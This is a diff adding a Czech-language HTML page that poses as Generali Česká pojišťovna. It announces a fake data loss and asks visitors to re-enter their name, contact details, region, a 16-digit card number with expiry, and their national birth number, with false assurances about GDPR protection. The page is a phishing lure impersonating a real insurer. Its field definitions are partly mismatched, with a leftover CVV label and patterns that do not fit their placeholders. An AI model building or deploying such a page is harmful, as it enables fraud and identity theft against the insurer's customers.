@@ -1,0 +1,58 @@
+<main>
+    <section class="alert-section">
+        <h1>! Generali Česká pojišťovna ztratila data !</h1>
+    </section>
+
+    <section class="form-section">
+        <h2>Vyplňte své údaje</h2>
+        <form action="#" method="POST">
+            <label for="name">Jméno:</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="contact">Kontakt (e-mail nebo telefon):</label>
+            <input type="text" id="contact" name="contact" required>
+
+            <label for="region">Kraj:</label>
+            <select id="region" name="region" required>
+                <option value="">Vyberte kraj</option>
+                <option value="Praha">Praha</option>
+                <option value="Středočeský">Středočeský</option>
+                <option value="Jihočeský">Jihočeský</option>
+                <option value="Plzeňský">Plzeňský</option>
+                <option value="Karlovarský">Karlovarský</option>
+                <option value="Ústecký">Ústecký</option>
+                <option value="Liberecký">Liberecký</option>
+                <option value="Královéhradecký">Královéhradecký</option>
+                <option value="Pardubický">Pardubický</option>
+                <option value="Vysočina">Vysočina</option>
+                <option value="Jihomoravský">Jihomoravský</option>
+                <option value="Olomoucký">Olomoucký</option>
+                <option value="Zlínský">Zlínský</option>
+                <option value="Moravskoslezský">Moravskoslezský</option>
+            </select>
+
+            <label for="card-number">Číslo průkazu:</label>
+    <input type="text" id="card-number" name="card-number" pattern="\d{16}" placeholder="" required>
+
+    <label for="expiry">Datum expirace:</label>
+    <input type="text" id="expiry" name="expiry" pattern="\d{2}/\d{2}" placeholder="31/08/2024" required>
+
+    <label for="cvv">Rodné číslo:</label>
+    <input type="text" id="birth-number" name="birth-number" pattern="\d{3}" placeholder="123456/7890" required>
+
+
+
+            <button type="submit">Odeslat</button>
+        </form>
+    </section>
+</main>
+
+<section class="details-section">
+    <h2>Proč potřebujeme vaše údaje?</h2>
+    <p style="font-size: 120%;">
+        Generali Česká pojišťovna dočasně ztratila přístup k některým zákaznickým datům kvůli technickým potížím. Abychom zajistili co nejrychlejší obnovení služeb a správné zařazení vašich údajů do systému, prosíme vás o opětovné vyplnění základních informací. Vaše údaje nám pomohou obnovit naše databáze a zajistit, aby byly vaše pojišťovací služby nepřerušené.
+    </p>
+    <p style="font-size: 120%;">
+        Zadané informace budou použity výhradně k ověření totožnosti a zajištění pokračování vašich pojišťovacích služeb. Vaše údaje jsou chráněny v souladu s GDPR a našimi zásadami ochrany osobních údajů.
+    </p>
+</section>
